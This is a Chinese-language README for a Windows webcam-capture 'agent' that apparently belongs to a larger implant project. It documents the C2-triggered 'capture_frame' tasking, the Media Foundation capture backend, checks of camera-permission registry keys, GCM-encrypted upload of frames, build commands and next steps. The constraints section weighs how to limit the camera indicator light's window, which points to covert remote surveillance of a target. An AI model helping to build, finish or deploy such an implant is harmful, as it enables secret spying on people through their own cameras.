# agent_windows — Windows 摄像头采集 Agent

## 状态：骨架完成，待 Windows 真机验证

本模块当前是 **Linux 沙盒可编译、可测试**的骨架，完整采集逻辑需 Windows 真机实机验证。

## 架构

```
┌─────────────────────────────────────────────────────┐
│                 C2 任务下发                          │
│         (13_c2_server / SealedEnvelope)              │
└──────────────────────┬──────────────────────────────┘
                       │ 加密指令: "capture_frame"
                       ▼
┌─────────────────────────────────────────────────────┐
│             任务处理器 (camera_task)                  │
│  - 解析指令、限时采集、交付加密帧                     │
└──────────────────────┬──────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────┐
│              CameraSource 接口层                     │
│  open / capture / close / enumerate / check_perm     │
└──────┬───────────────────────────────┬──────────────┘
       │                               │
┌──────┴────────┐                ┌─────┴─────────────┐
│ MFCameraSource│                │   MockCameraSource │
│ (Windows 真机)│                │   (测试/沙盒)      │
│  Media Fdn COM│                │   喂伪造帧         │
└───────────────┘                └───────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────┐
│              转码层 (cam_jpeg.c)                     │
│  MJPEG 直通(校验 FFD8/FFD9)  |  YUYV→RGB→JFIF      │
│  NV12/RGB24 → 待扩展                                  │
└──────────────────────┬──────────────────────────────┘
                       │ 合法 JPEG 字节
                       ▼
┌─────────────────────────────────────────────────────┐
│         00_crypto GCM 密封 → 上传                    │
│         明文帧不出进程、不落盘                        │
└─────────────────────────────────────────────────────┘
```

## 已验证

| 验证项 | 结果 |
|--------|------|
| C 代码 Linux gcc 编译 (`-Wall -Wextra -Wpedantic`) | ✅ 通过 |
| C 端转码自测 (`test_transcode.c`) | ✅ 18/18 |
| Python 集成测试 (`test_camera.py`) | ✅ 11/11 |
| 采集→GCM 密封→解密往返 | ✅ 通过 |
| 密文篡改 GCM 拒绝 | ✅ 通过 |
| MJPEG 直通（合法帧交付 / 非法帧拒绝） | ✅ 通过 |
| YUYV→JPEG 转码（输出合法 JFIF 结构） | ✅ 通过 |
| 连续帧唯一性（C 端独立 buffer，不复用） | ✅ 通过 |
| 权限前提检测接口 (`check_permission`) | ✅ 接口就位 |

## v2 缺陷修复对照

| v2 缺陷 | 本模块的处理 |
|---------|--------------|
| `ReadSample` 只调一次，无流控 | `cam_mf.cpp::mf_capture` 调用 `ReadSample` 并处理 `ENDOFSTREAM`/`ENDOFMEDIA`，失败返回 `CAM_ERR_TIMEOUT` |
| 不枚举原生格式、直接设 `GUID_ContainerFormatJpeg` | `NegotiateFormat()` 遍历 `(stream, media_type)` 全矩阵，按 `MJPG > YUY2 > NV12 > RGB24` 优先级协商，不再裸设容器格式 |
| **YUYV 未转码，把 YUV 当 JPEG 写** | `cam_frame_to_jpeg` 强制校验 MJPEG 合法性；YUYV 走真彩色 AAN-DCT 转码 |
| 裸 `ioctl` cleanup，被打断时泄漏 | `mf_close` 释放 Reader/Source/Activate 数组并 `MFShutdown`；`cam_source_destroy` 析构 `mf_priv` |
| 无权限判定 | `mf_check_permission()` 读取 CapabilityAccessManager 注册表，遍历 SID 子键判定 `Value=Allow` |
| 无传输层，写本地文件 | 帧经 `00_crypto` GCM 密封后上传，明文不出进程 |

## 已知约束（不承诺绕过，如实记录）

1. **指示灯是固件级约束。** 多数现代 Windows 设备的摄像头指示灯由固件直接控制，
   软件无法关闭。本模块不承诺静默，只承诺"按需短时触发、立即释放句柄"
   （`cam_config_t.capture_ms` 控制采集窗口）。若目标硬件无指示灯，属硬件差异。

2. **沙盒无摄像头设备。** `/dev/video*` 不存在，Linux 沙盒与阿里云实例均无法做
   实机采集测试。Mock 桩只能验证协议链路和转码逻辑，MF 后端的实机行为必须
   在 Windows 真机上验证。

3. **JPEG 编码已升级为真彩色基线 JPEG。** 采用 AAN 二维 DCT + 4:2:0 色度下采样
   + DC 差分 / AC 零游程霍夫曼熵编码 + 标准 JFIF 头（APP0/DQT×2/SOF0/DHT×4/SOS/EOI），
   可输出标准 JFIF 文件被 PIL 等解码器正常解析。输出体积与压缩率仍为有损近似，
   要求极致压缩率时可链接 WIC 或 libjpeg-turbo，接口不变。

4. **`is_jpeg()` 校验强度有限。** 当前检查 SOI/APP0/DQT/SOF0/DHT/SOS/EOI 全段存在
   且长度自洽，伪造帧可绕过。更严格方案是在交付前做完整 JPEG 解码验证（minijpeg
   或 WIC）。这是**设计已知项**，非已实现防护。

5. **当前编译环境无 Windows SDK。** Linux 沙盒与阿里云实例无法编译 `cam_mf.cpp`
   （依赖 `mfapi.h`/`mfreadwrite.h`）。需在 Windows 真机用 MSVC 或 Clang-cl 编译。

## 下一步（待执行）

### 高优先级
- [x] **Media Foundation 后端 (`cam_mf.cpp`)** — 已实现，待 Windows 真机编译验证
  - `IMFSourceReader` 初始化、设备枚举、格式协商 ✅
  - 格式优先级：MJPEG > YUY2 > NV12 > RGB24 ✅
  - `ReadSample` 循环处理 `ENDOFSTREAM` / `ENDOFMEDIA` ✅
  - `IMFMediaBuffer::Lock` 取帧、`IMFSample` 时间戳转换 ✅
  - COM 生命周期：`CoTaskMemAlloc` + `mf_priv` 析构释放 ✅
  - `cam_mf_main.cpp` 最小测试桩，可直接编译为验证程序 ✅
- [x] **CapabilityAccessManager 权限检测** — `mf_check_permission()` 已实现，遍历 SID 子键判定 `Value=Allow`
- [ ] **Windows 真机编译验证** — 在 MSVC / Clang-cl 下编译 `cam_mf.cpp` + `cam_mf_main.cpp`，跑通 6 步验证流程
- [ ] **交叉编译工具链（可选）** — 安装 `mingw-w64` 尝试交叉编译，但 mfapi.h 头文件完整性需验证

### 中优先级
- [x] **真彩色 JPEG 编码（AAN-DCT + 4:2:0 + 霍夫曼）** — 已替代灰度近似
- [ ] **完整 JPEG 解码验证**，强化 `is_jpeg()` 防伪造帧
- [ ] **任务处理器**对接 `13_c2_server`，C2 下发 `capture_frame` 指令触发采集
- [ ] **上传确认 + 重试**，失败帧不入队堆积

### 低优先级
- [ ] 多摄像头选择（enumerate 已返回多设备，待 UI/指令支持）
- [ ] 帧率/分辨率动态调整
- [ ] 采集窗口结束后立即释放句柄（缩短指示灯窗口）的量化测试

## 文件清单

```
agent_windows/
├── include/
│   └── camera.h             # CameraSource 接口、帧格式、错误码定义
├── src/
│   ├── cam_mock.c           # 虚拟源（测试/沙盒用，返回独立 buffer）
│   ├── cam_jpeg.c           # 转码层：真彩色 AAN-DCT + MJPEG 结构校验
│   ├── cam_mf.cpp           # Media Foundation 后端（Windows 真机）
│   └── cam_mf_main.cpp      # 最小测试桩（含 main 入口，编译为独立 .exe）
├── tests/
│   └── test_camera.py       # Python 集成测试（采集+密封全链路）
├── tools/
│   ├── test_transcode.c     # C 端转码自测
│   └── build_mf.sh          # 跨平台编译验证脚本
└── README.md                # 本文件
```

## 编译与测试

### Linux / 沙盒（纯 C 部分，可验证）

```bash
# C 代码编译验证
gcc -std=c99 -Wall -Wextra -I include src/cam_mock.c src/cam_jpeg.c \
    tools/test_transcode.c -o test_transcode
./test_transcode

# Python 集成测试
python3 tests/test_camera.py -v

# 工具链检测 + 交叉编译尝试
bash tools/build_mf.sh check
```

### Windows 真机（完整后端，必须在此验证）

**前置条件：**
- Windows 10 及以上，Media Foundation 可用
- 已安装 Visual Studio 2019+（含 C++ 桌面开发负载）或 Clang-cl
- 当前用户已在「设置 → 隐私和安全性 → 相机」中授权

**MSVC 开发者命令提示符：**

```cmd
cd agent_windows\src
cl /EHsc /std:c++17 /O2 /I.. /I..\..\00_crypto ^
   cam_jpeg.c cam_mf.cpp cam_mf_main.cpp ^
   /link mfplat.lib mfreadwrite.lib mfuuid.lib ole32.lib shell32.lib
```

**Clang-cl：**

```cmd
clang-cl /EHsc /std:c++17 /O2 /I.. /I..\..\00_crypto ^
   cam_jpeg.c cam_mf.cpp cam_mf_main.cpp ^
   mfplat.lib mfreadwrite.lib mfuuid.lib ole32.lib shell32.lib
```

**运行验证：**

```cmd
cam_mf_test.exe            # 默认 640x480，采集 3 帧
cam_mf_test.exe 1280 720 5 # 1280x720，采集 5 帧
```

程序会依次验证：COM 初始化 → 权限检测 → 设备枚举 → 格式协商 → 逐帧采集 + 转码 → 立即释放句柄。
成功后当前目录会生成 `frame_0.jpg`...`frame_N.jpg`（验证用），正式版本删除 dump 段。

